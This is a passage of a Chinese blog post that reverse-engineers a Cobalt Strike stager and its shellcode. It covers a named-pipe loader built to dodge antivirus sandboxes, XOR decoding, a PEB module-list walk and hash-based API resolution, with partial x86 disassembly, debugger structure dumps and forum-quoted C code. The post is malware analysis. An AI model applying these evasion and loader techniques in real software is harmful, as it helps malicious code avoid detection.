<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>Cobalt Strike Stager &amp; Stage Shellcode 深度解析 | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/blog/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/blog/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/blog/js/script.js"></script>
    
    <script src="/blog/js/tocbot.min.js"></script>
    



    
    



  <!-- for theme: default is false -->
  <!-- for page: default is true -->

<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">



<meta name="generator" content="Hexo 5.2.0"></head>
<body>
	
		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
       <script type="text/javascript" src="/js/wrapImage.js"></script>
   
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
            <div class="menu navbar-right">
                

<p><code>sub_401800()</code>将全局变量<code>FileName</code>填充为<code>\\.\pipe\MSSE-%d-server</code>的形式，然后另起线程调用<code>sub_4016D3()</code>，而<code>sub_4016D3()</code>调用<code>sub_401608()</code>建立管道，将加密的shellcode写入管道。</p>
<p><img src="/blog/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/image-20201021173926353.png"></p>
<p>在<code>sub_401800()</code>最后调用的<code>sub_4017A2()</code>中申请了一个堆用于存放shellcode并且为了等待线程写入完毕，特意等待了1024ms。</p>
<p><img src="/blog/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/image-20201021174018843.png"></p>
<p>然后就是循环调用<code>sub_4016F2</code>读取管道中的shellcode。</p>
<p>折腾这么一出是因为为了躲过杀软的沙箱查杀，因为沙箱不能很好的模拟管道（可能是因为效率也可能是因为觉得并无必要？）故无法执行代码进行查杀，而常规的数组加载shellcode会导致直接被杀掉。</p>
<p><img src="/blog/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/image-20201021174123458.png"></p>
<p>最后<code>sub_401559()</code>中，将读入堆中的shellcode进行解密并申请虚拟空间，用<code>VirtualProtect()</code>将申请到的空间加入可读和执行权限再创建线程执行：</p>
<p><img src="/blog/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/image-20201021174201888.png"></p>
<div style="page-break-after: always;">

</div>
<h3 id="stager-shellcode">2. Stager Shellcode</h3>
<h4 id="start">2.1 start</h4>
<p>xor解密是四字节一组进行解密的，并且只用到了<code>xor_key</code>的前四个字节。</p>
<p><img src="/blog/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/image-20201021174251460.png"></p>
<p>而解码后的shellcode可以转换为如下的x86汇编代码:</p>
<pre class="x86asm"><code>0x0000:  FC                cld    
0x0001:  E8 89 00 00 00    call   0x8f  
;======================== 寻找函数地址 ==========================
...
; ======================== 核心函数 =============================
0x008f:  5D                pop    ebp
0x0090:  68 6E 65 74 00    push   0x74656e   ; &quot;wininet\x00&quot;入栈
0x0095:  68 77 69 6E 69    push   0x696e6977
0x009a:  54                push   esp       
0x009b:  68 4C 77 26 07    push   0x726774c
0x00a0:  FF D5             call   ebp        ; LoadLibraryA(&quot;wininet&quot;)</code></pre>
<p>先<code>cld</code>清理符号位，再用<code>call</code>将寻址函数地址入栈，然后再<code>pop ebp</code>，后续所有的函数都是以<code>call ebp</code>的形式调用，重点关注一下shellcode是如何找到函数地址的。
#### 2.2 函数寻址</p>
<pre class="x86asm"><code>;========================= 寻找函数地址 ========================
0x0006:  60            pushal ;push EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI
0x0007:  89 E5         mov    ebp, esp
0x0009:  31 D2         xor    edx, edx
0x000b:  64 8B 52 30   mov    edx, fs:[edx + 0x30]       ;edx=PEB
0x000f:  8B 52 0C      mov    edx, [edx + 0xc]           ;edx=PEB_LDR_DATA
0x0012:  8B 52 14      mov    edx, [edx + 0x14]          ;edx=InMemoryOrderModuleList
0x0015:  8B 72 28      mov    esi, [edx + 0x28]          ;???
0x0018:  0F B7 4A 26   movzx  ecx, word ptr [edx + 0x26] ;???</code></pre>
<p>首先用<code>pushal</code>将所有寄存器在栈上存起来备份，再调整栈帧，<code>edx</code>置零。</p>
<p>寄存器<code>FS</code>在Windows上指向的是TEB线程信息块（Thread
Environment Block）。读取TEB可以读取到进、线程以及与系统相关的信息。</p>
<p><code>TEB</code>结构用x86 windbg输出如下：</p>
<pre class="x86asm"><code>&gt; dt _TEB
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : Ptr32 Void
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : Ptr32 Void
   +0x02c ThreadLocalStoragePointer : Ptr32 Void
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB      # Fetch
   +0x034 LastErrorValue   : Uint4B
   +0x038 CountOfOwnedCriticalSections : Uint4B
   +0x03c CsrClientThread  : Ptr32 Void
   +0x040 Win32ThreadInfo  : Ptr32 Void
   +0x044 User32Reserved   : [26] Uint4B
   +0x0ac UserReserved     : [5] Uint4B
   +0x0c0 WOW32Reserved    : Ptr32 Void
   +0x0c4 CurrentLocale    : Uint4B
   +0x0c8 FpSoftwareStatusRegister : Uint4B
   +0x0cc SystemReserved1  : [54] Ptr32 Void
   +0x1a4 ExceptionCode    : Int4B
   +0x1a8 ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
   ....</code></pre>
<p>故<code>mov edx, fs:[edx + 0x30]</code>是取的PEB的地址（Process
Environment Block）。</p>
<p>而下一条指令<code>mov edx, [edx+0xc]</code>就很明显读取的是<code>Ldr</code>结构。</p>
<pre class="x86asm"><code>&gt; dt _PEB
ntdll!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsLegacyProcess  : Pos 2, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit
   +0x003 SpareBits        : Pos 5, 3 Bits
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA                   # Fetch
   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : Ptr32 Void
   +0x018 ProcessHeap      : Ptr32 Void
   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION
   +0x020 AtlThunkSListPtr : Ptr32 Void
   +0x024 IFEOKey          : Ptr32 Void
   +0x028 CrossProcessFlags : Uint4B
   ...</code></pre>
<p>其数据结构为<code>_PEB_LDR_DATA</code>：</p>
<pre class="x86asm"><code>&gt; dt _PEB_LDR_DATA
ntdll!_PEB_LDR_DATA
   +0x000 Length           : Uint4B
   +0x004 Initialized      : UChar
   +0x008 SsHandle         : Ptr32 Void
   +0x00c InLoadOrderModuleList : _LIST_ENTRY
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY           # Fetch
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY
   +0x024 EntryInProgress  : Ptr32 Void
   +0x028 ShutdownInProgress : UChar
   +0x02c ShutdownThreadId : Ptr32 Void
   ...</code></pre>
<p>于是我们可以看到<code>mov edx, [edx+0x14]</code>读取的是<code>InMemoryOrderModuleList</code>，其数据结构为<code>_LIST_ENTRY</code>，微软文档中将<code>InMemoryOrderModuleList</code>描述为:</p>
<blockquote>
<p>The head of a doubly-linked list that contains the loaded modules for
the process. Each item in the list is a pointer to an
**_LDR_DATA_TABLE_ENTRY** structure.</p>
</blockquote>
<h5 id="奇怪的inmemoryordermodulelist指针">2.2.1
奇怪的<code>InMemoryOrderModuleList</code>指针</h5>
<p>既然是一个包含<code>_LDR_DATA_TABLE_ENTRY</code>
指针的双链表结构，那么毫无疑问，结构体<code>_LIST_ENTRY</code>将包含首尾两个指针——分别为<code>Flink</code>和<code>Blink</code>：</p>
<pre class="x86asm"><code>&gt; dt _LIST_ENTRY
ntdll!_LIST_ENTRY
   +0x000 Flink            : Ptr32 _LIST_ENTRY
   +0x004 Blink            : Ptr32 _LIST_ENTRYas</code></pre>
<p>由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而指令<code>mov esi, [edx+0x28]</code>却让人摸不着头脑：明明<code>_LIST_ENTRY</code>是一个8字节大小的双链表节点，你不取指针拿到<code>_LDR_DATA_TABLE_ENTRY</code>结构进行下一步操作而是直接拿链表地址<code>edx+0x28</code>赋值给<code>esi</code>，难道文档中的<code>Each item in the list is a pointer to a _LDR_DATA_TABLE_ENTRY structure</code>我们理解错了吗？</p>
<p>对此笔者进行了搜索，发现了一个国外论坛的帖子，十分有趣地讨论了这一个问题：</p>
<p><a target="_blank" rel="noopener" href="https://www.unknowncheats.me/forum/general-programming-and-reversing/190128-inmemoryordermodulelist-documentation-im-confused.html">InMemoryOrderModuleList
Documentation - I'm confused</a></p>
<p>原贴如下：</p>
<hr>
<p>hey everyone,</p>
<p>i found a neat little tutorial to grab the base address of
kernel32.dll without using GetModuleHandle.
http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/</p>
<p>i also found all the necessary structs here
http://undocumented.ntinternals.net/</p>
<p>i already successfully implemented this. according to the sources
above, the base address is at 0x10 of the third list element. however
MSDN documents something else:
https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx</p>
<p>Quote:</p>
<blockquote>
<p>InMemoryOrderModuleList</p>
<p>The head of a doubly-linked list that contains the loaded modules for
the process. Each item in the list is a pointer to an
LDR_DATA_TABLE_ENTRY structure. For more information, see Remarks.</p>
</blockquote>
<p>Code:</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> _LDR_DATA_TABLE_ENTRY <span class="op">&#123;</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>PVOID Reserved1<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>LIST_ENTRY InMemoryOrderLinks<span class="op">;</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>PVOID Reserved2<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>PVOID DllBase<span class="op">;</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>PVOID EntryPoint<span class="op">;</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>PVOID Reserved3<span class="op">;</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>UNICODE_STRING FullDllName<span class="op">;</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>BYTE Reserved4<span class="op">[</span><span class="dv">8</span><span class="op">];</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>PVOID Reserved5<span class="op">[</span><span class="dv">3</span><span class="op">];</span></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="kw">union</span> <span class="op">&#123;</span></span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>ULONG CheckSum<span class="op">;</span></span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>PVOID Reserved6<span class="op">;</span></span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;;</span></span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>ULONG TimeDateStamp<span class="op">;</span></span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span> LDR_DATA_TABLE_ENTRY<span class="op">,</span> <span class="op">*</span>PLDR_DATA_TABLE_ENTRY<span class="op">;</span></span></code></pre></div>
<p><strong>according to this, it should be at 0x18 (which isn't the
case. it is at 0x10 for sure, already tested it). am i misunderstanding
the sentence "Each item in the list is a pointer to an
LDR_DATA_TABLE_ENTRY structure." or are microsoft just publishing wrong
information?</strong> /e: for reference, this works: Code:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>PPEB ppeb   <span class="op">=</span> reinterpret_cast<span class="op">&lt;</span>PPEB<span class="op">&gt;(</span>__readfsdword<span class="op">(</span><span class="bn">0x30</span><span class="op">));</span>m_hKernel32 <span class="op">=</span> <span class="op">*</span>reinterpret_cast<span class="op">&lt;</span>HMODULE<span class="op">*&gt;(</span>reinterpret_cast<span class="op">&lt;</span><span class="dt">uintptr_t</span><span class="op">&gt;(</span>ppeb<span class="op">-&gt;</span>Ldr<span class="op">-&gt;</span>InMemoryOrderModuleList<span class="op">.</span>Flink<span class="op">-&gt;</span>Flink<span class="op">-&gt;</span>Flink<span class="op">)</span> <span class="op">+</span> <span class="bn">0x10</span><span class="op">);</span></span></code></pre></div>
<p>and this doesn't, although it is correct according to MSDN Code:</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>PPEB ppeb   <span class="op">=</span> reinterpret_cast<span class="op">&lt;</span>PPEB<span class="op">&gt;(</span>__readfsdword<span class="op">(</span><span class="bn">0x30</span><span class="op">));</span>m_hKernel32 <span class="op">=</span> reinterpret_cast<span class="op">&lt;</span>HMODULE<span class="op">&gt;(</span>reinterpret_cast<span class="op">&lt;</span>PLDR_DATA_TABLE_ENTRY<span class="op">&gt;(</span>ppeb<span class="op">-&gt;</span>Ldr<span class="op">-&gt;</span>InMemoryOrderModuleList<span class="op">.</span>Flink<span class="op">-&gt;</span>Flink<span class="op">-&gt;</span>Flink<span class="op">)-&gt;</span>DllBase<span class="op">);</span></span></code></pre></div>
<hr>
<p>发帖者声称找到了一种不需要<code>GetModuleHandle</code>函数就能优雅地定位<code>kernal32.dll</code>的方法，并对微软官方文档和偏移误差提出了疑问，同时也怀疑自己是否理解错了官方文档中的那句<strong>“列表中每项都有一个指向LDR_DATA_TABLE_ENTRY
结构的指针”</strong>。</p>
<p>而回答也十分言简意赅，指出了<code>Flink</code>和<code>Blink</code>是指向<code>LDR_DATA_TABLE_ENTRY</code>结构体中的<code>InMemoryOrderModuleList</code>而非结构体的起始地址，并同时给出了<code>CONTAINING_RECORD</code>宏的用法——给出数据结构与调用的成员，从而找到数据起始的地址。</p>
<hr>
<p>Each Flink and Blink are pointers to LDR_DATA_TABLE_ENTRY, like MSDN
says. But they don't point to the start of struct like your last piece
of code assumes. They point to the InMemoryOrderModuleList member of the
struct. To get the start of the LDR_DATA_TABLE_ENTRY from the FLink you
have to subtract the InMemoryOrderModuleList field offset. This is what
the CONTAINING_RECORD macro is used for.</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>PLDR_DATA_TABLE_ENTRY dataEntry <span class="op">=</span> CONTAINING_RECORD<span class="op">(</span>listEntry<span class="op">,</span> LDR_DATA_TABLE_ENTRY<span class="op">,</span> InMemoryOrderModuleList<span class="op">);</span></span></code></pre></div>
<p>Where listEntry is one of the F/Blinks</p>
<hr>
<p>其中<code>CONTAINING_RECORD</code>宏的定义如下：</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define CONTAINING_RECORD(address,type,field) ((type*)((PCHAR)(address)-(ULONG_PTR)(&amp;((type*)0)-&gt;field)))</span></span></code></pre></div>
<p>利用强制类型转换将地址0转化为<code>type</code>类型，即传进来的数据结构体类型，然后调用成员取其地址，因为强制类型转化的地址是0，那么调用其成员后的地址即为结构体内成员的偏移地址，故我们得到<code>成员真实地址 - 成员偏移地址=结构体起始地址</code>。</p>
<p>具体可以参考这两篇文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Crazycatmiao/p/6731477.html">[CRAZYC4T] -
CONTAINING_RECORD</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.twofei.com/546/">[movsb] -
我对CONTAINING_RECORD宏的详细解释</a></p>
<h5 id="奇怪的偏移0x28">2.2.2 奇怪的偏移<code>0x28</code></h5>
<p>那么我们将目光转回来。既然由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而在<code>_LDR_DATA_TABLE_ENTRY</code>结构体中<code>InMemoryOrderModuleList</code>是偏移为0x08，所以指令<code>mov esi, [edx+0x28]</code>访问的是<code>_LDR_DATA_TABLE_ENTRY+0x08+0x28</code>的地方，即偏移为<code>0x30</code>。</p>
<p>那么我们用x86
windbg输出<code>_LDR_DATA_TABLE_ENTRY</code>结构体：</p>
<pre class="x86asm"><code>dt _LDR_DATA_TABLE_ENTRY
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x008 InMemoryOrderLinks : _LIST_ENTRY
   +0x010 InInitializationOrderLinks : _LIST_ENTRY
   +0x018 DllBase          : Ptr32 Void
   +0x01c EntryPoint       : Ptr32 Void
   +0x020 SizeOfImage      : Uint4B
   +0x024 FullDllName      : _UNICODE_STRING
   +0x02c BaseDllName      : _UNICODE_STRING  
   +0x034 Flags            : Uint4B           ;+0x030 x86asmxist. What???
   +0x038 LoadCount        : Uint2B
   +0x03a TlsIndex         : Uint2B
   +0x03c HashLinks        : _LIST_ENTRY
   +0x03c SectionPointer   : Ptr32 Void
   +0x040 CheckSum         : Uint4B
   +0x044 TimeDateStamp    : Uint4B
   +0x044 LoadedImports    : Ptr32 Void
   +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
   +0x04c PatchInformation : Ptr32 Void
   +0x050 ForwarderLinks   : _LIST_ENTRY
   +0x058 ServiceTagLinks  : _LIST_ENTRY
   +0x060 StaticLinks      : _LIST_ENTRY
   +0x068 ContextInformation : Ptr32 Void
   +0x06c OriginalBase     : Uint4B
   +0x070 LoadTime         : _LARGE_INTEGER</code></pre>
<p>发现偏移<code>0x30</code>处并不存在完整的数据结构。</p>
<p>难道我们理解错了吗？</p>
<p>利用scdbg对进行shellcode调试发现指令<code>mov esi, [edx+0x28]</code>读到了偏移为<code>0x2c</code>的<code>BaseName</code>的地址，而<code>mov ecx, [edx+0x26]</code>则读到了对应的<code>BaseName</code>的字符串长度（后面发现其实是最大长度，长度不计算字符<code>\x00</code>）。</p>
<p><img src="/blog/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/image-20201020115459257.png"></p>
<p>那么我们可以合理猜测，<code>BaseDLLName</code>的类型<code>_UNICODE_STRING</code>并非是一个简单的指针，而是一个结构体，包含了长度和地址等信息。</p>
<p>在文章<a target="_blank" rel="noopener" href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/">Locating
DLL Name from the Process Environment Block
(PEB)</a>中，我们的想法得到了印证：</p>
<hr>
<p>So what are we missing? Notice that <em>BaseDllName</em> is of type
<em>UNICODE_STRING</em> this will require a little more investigation.
According to Microsoft, this isn’t simply a pointer to a Unicode string
but rather a <em>UNICODE_STRING</em> structure (<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wudfwdm/ns-wudfwdm-_unicode_string">MSDN</a>),
which is defined as:</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> _UNICODE_STRING <span class="op">&#123;</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>USHORT Length<span class="op">;</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>USHORT MaximumLength<span class="op">;</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>PWSTR  Buffer<span class="op">;</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span> UNICODE_STRING<span class="op">,</span> <span class="op">*</span>PUNICODE_STRING<span class="op">;</span></span></code></pre></div>
<p>Notice how this structure begins with two short values –
<em>Length</em> and <em>MaximumLength</em>. To access the pointer to the
string, we need to adjust from the base of this structure 4 bytes (2
shorts/2 bytes * 2). With this is mind, it should now be clear how the
code is obtaining the Unicode string for the DLL name.</p>
<pre class="x86asm"><code>+0x008 InMemoryOrderLinks : _LIST_ENTRY
+0x010 InInitializationOrderLinks : _LIST_ENTRY
+0x018 DllBase : Ptr32 Void
+0x01c EntryPoint : Ptr32 Void
+0x020 SizeOfImage : Uint4B
+0x024 FullDllName : _UNICODE_STRING
+0x02c BaseDllName : _UNICODE_STRING
+0x02c Length : USHORT
+0x02e MaximumLength : USHORT
+0x030 Buffer : PWSTR</code></pre>
<hr>
<h5 id="通过hash找到目标函数">2.2.3 通过Hash找到目标函数</h5>
<p>于是，指令<code>mov esi, [edx+0x28]</code>以及<code>mov esi, [edx+0x26]</code>将得到<code>esi=BaseDLLName</code>、<code>ecx=BaseDLLNameLen</code>。</p>
<p>接下来就是通过自己设计的一个算法计算<code>BaseDLLName</code>的HASH，存入栈中。</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>0x001c:  31 FF        <span class="op">xor</span>    <span class="kw">edi</span><span class="op">,</span> <span class="kw">edi</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>0x001e:  31 C0        <span class="op">xor</span>    <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>0x0020:  AC           lodsb  <span class="kw">al</span><span class="op">,</span> <span class="dt">byte</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esi</span><span class="op">]</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>0x0021:  3C 61        <span class="bu">cmp</span>    <span class="kw">al</span><span class="op">,</span> <span class="bn">0x61</span>  <span class="co">;&quot;a&quot;</span></span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>0x0023:  7C 02        <span class="cf">jl</span>     <span class="bn">0x27</span>        </span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>0x0025:  2C 20        <span class="bu">sub</span>    <span class="kw">al</span><span class="op">,</span> <span class="bn">0x20</span>  <span class="co">;lowercase to uppercase</span></span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>0x0027:  C1 CF <span class="dv">0</span><span class="bn">D</span>     ror    <span class="kw">edi</span><span class="op">,</span> <span class="bn">0xd</span>     </span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>0x002a:  01 C7        add    <span class="kw">edi</span><span class="op">,</span> <span class="kw">eax</span></span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>0x002c:  E2 F0        loop   <span class="bn">0x1e</span>      <span class="co">;calc DLL Hash</span></span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>0x002e:  52           <span class="bu">push</span>   <span class="kw">edx</span>       <span class="co">;save edx=InMemoryOrderModuleList</span></span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>0x002f:  57           <span class="bu">push</span>   <span class="kw">edi</span>       <span class="co">;save edi=DLL Hash</span></span></code></pre></div>
<p>其实我们可以通过遍历链表得到了当前程序导入的所有<code>DLL Name Hash</code>，此时就可以与事先用hash算法计算出的<code>kernel32.dll</code>的哈希值<code>hash("kernel32.dll")</code>进行比较，从而知道当前<code>_LDR_DATA_TABLE_ENTRY</code>是不是我们想要的结构体，若匹配得上就取出<code>_LDR_DATA_TABLE_ENTRY</code>中的<code>DLL Base</code>，开始下一步寻找目标函数的操作。（就是跟Linux
Pwn的差不多的思路，需要Leak动态链接库的基址然后找到对应的函数的虚拟地址VA）</p>
<p>但是CS采用的是另一种方式，因为上面我说的方式需要将<code>DLL Name</code>和<code>Func Name</code>分别计算哈希并判断，而CS是将它的hash值定义为<code>HASH = hash(DLL Name) +hash(Func Name)</code>（这里的<code>+</code>号是加法的加，而不是哈希值拼接的意思）。然后CS的思路为：</p>
<ol type="1">
<li>遍历<code>InMemoryOrderModuleList</code>链表结构，进入到每一个<code>DLL</code>中寻找导出函数，计算函数名的哈希值；</li>
<li>计算<code>HASH = hash(DLL Name) +hash(Func Name)</code>是否和事前计算出来的目标函数哈希值是否相符；</li>
<li>若相符则直接<code>jmp eax</code>进行跳转执行。</li>
</ol>
<p>其实无论哪种思路都是规避查杀的一种方式，避免了敏感的<code>kernel32</code>、<code>GetModuleHandle</code>等明文字符出现在Shellcode中，避免静态查杀被干掉。<strong>虽然引入了Hash算法会稍稍增大Shellcode体积，但是如果要使用一些长度较长的函数的话，这么做即减少了Shellcode体积又规避了查杀，后续稍微改改算法又能绕过一波杀软，怪不得MSF和CS都大量地使用这种Shellcode写法。</strong></p>
<p>接下来我们再一步一步看Shellcode的思路与细节：</p>
<ol type="1">
<li>获取<code>_LDR_DATA_TABLE_ENTRY</code>
中的<code>DLLBase</code>；</li>
<li>找到从MZ头到PE头再找到导入表；</li>
<li>再由导入表获取导出函数名以及个数，遍历获取计算HASH，再与事先计算好的8字节长的HASH匹配。</li>
</ol>
<pre class="x86asm"><code>0x0030:  8B 52 10   mov    edx, dword ptr [edx + 0x10] ;edx=DLLBase
0x0033:  8B 42 3C   mov    eax, dword ptr [edx + 0x3c] ;eax=PE Header RVA
0x0036:  01 D0      add    eax, edx                    ;eax=PE Header VA
0x0038:  8B 40 78   mov    eax, dword ptr [eax + 0x78] ;eax=ExportTable RVA
0x003b:  85 C0      test   eax, eax
0x003d:  74 4A      je     0x89
0x003f:  01 D0      add    eax, edx                    ;eax=ExportTable RVA
0x0041:  50         push   eax                         ;save ExportTable VA
0x0042:  8B 48 18   mov    ecx, dword ptr [eax + 0x18] ;ecx=NumberOfNames  
0x0045:  8B 58 20   mov    ebx, dword ptr [eax + 0x20] ;ebx=AddressOfNamesRVA
0x0048:  01 D3      add    ebx, edx                    ;ebx=AddressOfNamesVA
0x004a:  E3 3C      jecxz  0x88                        ;若遍历完毕寻找下一个模块
0x004c:  49         dec    ecx
0x004d:  8B 34 8B   mov    esi, dword ptr [ebx + ecx*4]
0x0050:  01 D6      add    esi, edx                     ;esi=ExportFunctionNameVA
0x0052:  31 FF      xor    edi, edi
0x0054:  31 C0      xor    eax, eax
0x0056:  AC         lodsb  al, byte ptr [esi]          
0x0057:  C1 CF 0D   ror    edi, 0xd
0x005a:  01 C7      add    edi, eax
0x005c:  38 E0      cmp    al, ah                       ;判断等于\x00，即字符串结束
0x005e:  75 F4      jne    0x54                         ;edi=FunctionNameHash
0x0060:  03 7D F8   add    edi, dword ptr [ebp - 8]     ;[ebp-8]=DLL hash
                                                                    ;edi=DLL hash+FunctionNameHash
;[ebp+0x24]=倒数十入栈的参数，即函数调用的第一个参数，即提前计算好的Hash值
0x0063:  3B 7D 24   cmp    edi, dword ptr [ebp + 0x24]  
0x0066:  75 E2      ne    0x4a                         ;若不相等，计算下一个导出函数

0x0080:  5B         pop    ebx
0x0081:  5B         pop    ebx                          ;调整栈帧
0x0082:  61         popal                               ;恢复寄存器
0x0083:  59         pop    ecx                          ;返回地址
0x0084:  5A         pop    edx                          ;call ebp的第一个参数，已经没用了
0x0085:  51         push   ecx                          ;返回地址入栈
0x0086:  FF E0      jmp    eax                          ;jmp函数VA</code></pre>
<p>MZ文件头结构<code>_IMAGE_DOS_HEADER</code>如下，则指令<code>mov eax, [edx + 0x3c]</code>取出的是<code>e_lfanew</code>，即PE头的偏移。</p>
<pre class="x86asm"><code>dt _IMAGE_DOS_HEADER
ntdll!_IMAGE_DOS_HEADER
   +0x000 e_magic          : Uint2B
   +0x002 e_cblp           : Uint2B
   +0x004 e_cp             : Uint2B
   +0x006 e_crlc           : Uint2B
   +0x008 e_cparhdr        : Uint2B
   +0x00a e_minalloc       : Uint2B
   +0x00c e_maxalloc       : Uint2B
   +0x00e e_ss             : Uint2B
   +0x010 e_sp             : Uint2B
